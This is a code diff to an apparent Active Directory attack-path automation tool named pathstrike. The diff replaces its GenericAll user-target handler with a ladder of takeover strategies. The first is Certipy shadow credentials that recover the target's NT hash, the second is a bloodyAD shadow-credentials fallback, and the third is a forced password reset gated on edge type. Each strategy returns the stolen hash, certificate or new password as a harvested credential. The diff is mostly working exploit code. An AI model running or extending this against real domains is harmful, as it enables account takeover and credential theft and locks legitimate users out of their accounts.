@@ -21,6 +21,7 @@ from pathstrike.models import (
     RollbackAction,
 )
 from pathstrike.tools import bloodyad_wrapper as bloody
+from pathstrike.tools.certipy_wrapper import certipy_shadow
 
 
 def _generate_password(length: int = 20) -> str:
@@ -70,47 +71,18 @@ class GenericAllHandler(BaseEdgeHandler):
         new_creds: list[Credential] = []
 
         match edge.target.label.lower():
-            # ----- User target: shadow credentials or password reset -----
+            # ----- User target: strategy ladder gated on edge type ------------
             case "user":
                 if dry_run:
-                    return True, f"[DRY RUN] Would add shadow credential to {target}", []
-
-                self.logger.info("Attempting shadow credentials on user %s", target)
-                result = await bloody.add_key_credential(self.config, auth_args, target)
-
-                if result["success"]:
-                    # bloodyAD outputs certificate info on success
-                    cert_path = result.get("output", "")
-                    new_creds.append(
-                        Credential(
-                            cred_type=CredentialType.certificate,
-                            value=cert_path,
-                            username=target,
-                            domain=self._get_domain(),
-                            obtained_from=f"GenericAll shadow creds on {target}",
-                        )
+                    return (
+                        True,
+                        f"[DRY RUN] Would try Certipy shadow auto → bloodyAD "
+                        f"shadow creds → password reset on user {target}",
+                        [],
                     )
-                    return True, f"Shadow credential added to {target}", new_creds
-
-                # Fallback: force password change
-                self.logger.warning(
-                    "Shadow creds failed for %s, falling back to password change", target
+                return await self._exploit_user_ladder(
+                    edge, target, principal, auth_args,
                 )
-                new_pass = _generate_password()
-                result = await bloody.set_password(self.config, auth_args, target, new_pass)
-                if not result["success"]:
-                    return False, f"Failed to change password for {target}: {result.get('error', 'unknown')}", []
-
-                new_creds.append(
-                    Credential(
-                        cred_type=CredentialType.password,
-                        value=new_pass,
-                        username=target,
-                        domain=self._get_domain(),
-                        obtained_from=f"GenericAll password reset on {target}",
-                    )
-                )
-                return True, f"Password changed for {target}", new_creds
 
             # ----- Group target: add self as member -----
             case "group":
@@ -149,6 +121,177 @@ class GenericAllHandler(BaseEdgeHandler):
 
             case _:
                 return False, f"Unsupported target type: {edge.target.label}", []
+
+    # Edge types that grant the User-Force-Change-Password extended right
+    # (thus allowing an admin password reset via ``set unicodePwd``).
+    # GenericWrite, WriteDacl alone, and WriteProperty do NOT include it —
+    # skipping password reset for those edges avoids a guaranteed-fail LDAP
+    # modify that would otherwise surface as a noisy dead end.
+    _PASSWORD_RESET_CAPABLE_EDGES = frozenset({
+        "genericall",
+        "owns",
+        "ownsraw",
+        "forcechangepassword",
+        "allextendedrights",
+    })
+
+    async def _exploit_user_ladder(
+        self,
+        edge: EdgeInfo,
+        target: str,
+        principal: str,
+        auth_args: list[str],
+    ) -> tuple[bool, str, list[Credential]]:
+        """Try User-target exploits in order, stopping at first success.
+
+        Order (least → most disruptive) with global validity gates:
+
+        1. **Certipy Shadow Credentials (``certipy shadow auto``)** — adds
+           the KeyCredentialLink, performs PKINIT, recovers the NT hash in
+           one atomic flow.  Most reliable because it separates the LDAP
+           write and PKINIT phases (unlike bloodyAD's single-shot U2U,
+           which can trip on ``KDC_ERR_CLIENT_NOT_TRUSTED``).  Valid for
+           any ACL edge that can write ``msDS-KeyCredentialLink``.
+        2. **bloodyAD Shadow Credentials** — fallback implementation for
+           the same attack.  Tries when certipy is unavailable or fails.
+        3. **Force password reset** — only attempted when the edge type
+           grants the ``User-Force-Change-Password`` extended right
+           (GenericAll, Owns, ForceChangePassword, AllExtendedRights).
+           Skipped for GenericWrite / WriteDacl / WriteProperty because
+           those edges cannot reset a password — the LDAP modify will
+           return ``oldpass not valid`` regardless of intent.
+
+        Edge-type gating is a hard correctness constraint, not a
+        performance optimisation: password reset on a GenericWrite edge
+        can never succeed on any AD domain, so Pathstrike should never
+        try.
+        """
+        new_creds: list[Credential] = []
+        strategy_errors: list[str] = []
+        edge_type_lower = (edge.edge_type or "").lower()
+
+        # -------- Strategy 1: Certipy shadow auto -------------------------
+        self.logger.debug(
+            "[Strategy 1/3] Certipy shadow auto on user %s", target,
+        )
+        certipy_auth_args = self._get_certipy_auth_args(principal)
+        dc = self.config.domain.dc_fqdn or self.config.domain.dc_host
+        result = await certipy_shadow(
+            "auto", target=dc, account=target, auth_args=certipy_auth_args,
+        )
+        if result["success"]:
+            self._successful_strategy = "certipy_shadow_auto"
+            parsed = result.get("parsed") or {}
+            nt_hash = parsed.get("nt_hash")
+            if nt_hash:
+                new_creds.append(
+                    Credential(
+                        cred_type=CredentialType.nt_hash,
+                        value=nt_hash,
+                        username=target,
+                        domain=self._get_domain(),
+                        obtained_from=f"certipy shadow auto on {target}",
+                    )
+                )
+                return (
+                    True,
+                    f"Shadow Credentials via Certipy: recovered NT hash for {target}",
+                    new_creds,
+                )
+            # Some certipy builds return success with the PFX but no hash
+            # parsed out.  Treat as partial and fall through.
+            pfx_path = parsed.get("pfx_path") or parsed.get("pfx")
+            if pfx_path:
+                new_creds.append(
+                    Credential(
+                        cred_type=CredentialType.certificate,
+                        value=pfx_path,
+                        username=target,
+                        domain=self._get_domain(),
+                        obtained_from=f"certipy shadow auto on {target} (cert only)",
+                    )
+                )
+                return (
+                    True,
+                    f"Shadow Credentials via Certipy: captured PFX for {target} "
+                    f"(NT hash parse failed — authenticate manually)",
+                    new_creds,
+                )
+            strategy_errors.append("Certipy shadow auto: succeeded but no hash/cert in output")
+        else:
+            err = result.get("error", "unknown")
+            strategy_errors.append(f"Certipy shadow auto: {err}")
+            self.logger.warning("Certipy shadow auto failed on %s: %s", target, err)
+
+        # -------- Strategy 2: bloodyAD shadow credentials -----------------
+        self.logger.debug(
+            "[Strategy 2/3] bloodyAD shadowCredentials on user %s", target,
+        )
+        result = await bloody.add_key_credential(self.config, auth_args, target)
+        if result["success"]:
+            self._successful_strategy = "bloodyad_shadow_creds"
+            cert_path = result.get("output", "")
+            new_creds.append(
+                Credential(
+                    cred_type=CredentialType.certificate,
+                    value=cert_path,
+                    username=target,
+                    domain=self._get_domain(),
+                    obtained_from=f"bloodyAD shadow creds on {target}",
+                )
+            )
+            return (
+                True,
+                f"Shadow Credentials via bloodyAD: added KeyCredentialLink to {target}",
+                new_creds,
+            )
+        err = result.get("error", "unknown")
+        strategy_errors.append(f"bloodyAD shadow creds: {err}")
+        self.logger.warning("bloodyAD shadow creds failed on %s: %s", target, err)
+
+        # -------- Strategy 3: Force password reset (gated on edge type) ---
+        if edge_type_lower in self._PASSWORD_RESET_CAPABLE_EDGES:
+            self.logger.debug(
+                "[Strategy 3/3] Force password reset on %s (disruptive)", target,
+            )
+            new_pass = _generate_password()
+            result = await bloody.set_password(
+                self.config, auth_args, target, new_pass,
+            )
+            if result["success"]:
+                self._successful_strategy = "password_reset"
+                new_creds.append(
+                    Credential(
+                        cred_type=CredentialType.password,
+                        value=new_pass,
+                        username=target,
+                        domain=self._get_domain(),
+                        obtained_from=f"Password reset on {target}",
+                    )
+                )
+                return True, f"Password reset for {target}", new_creds
+            err = result.get("error", "unknown")
+            strategy_errors.append(f"Password reset: {err}")
+            self.logger.warning("Password reset failed on %s: %s", target, err)
+        else:
+            self.logger.info(
+                "Skipping password reset on %s: edge type '%s' does not grant "
+                "User-Force-Change-Password (requires GenericAll / Owns / "
+                "ForceChangePassword / AllExtendedRights)",
+                target, edge.edge_type,
+            )
+            strategy_errors.append(
+                f"Password reset: skipped (edge '{edge.edge_type}' lacks "
+                f"ResetPassword right)"
+            )
+
+        # -------- All strategies exhausted --------------------------------
+        combined = "; ".join(strategy_errors)
+        return (
+            False,
+            f"All user-target strategies failed on {target}: {combined}",
+            [],
+        )
 
     async def _exploit_computer_ladder(
         self,
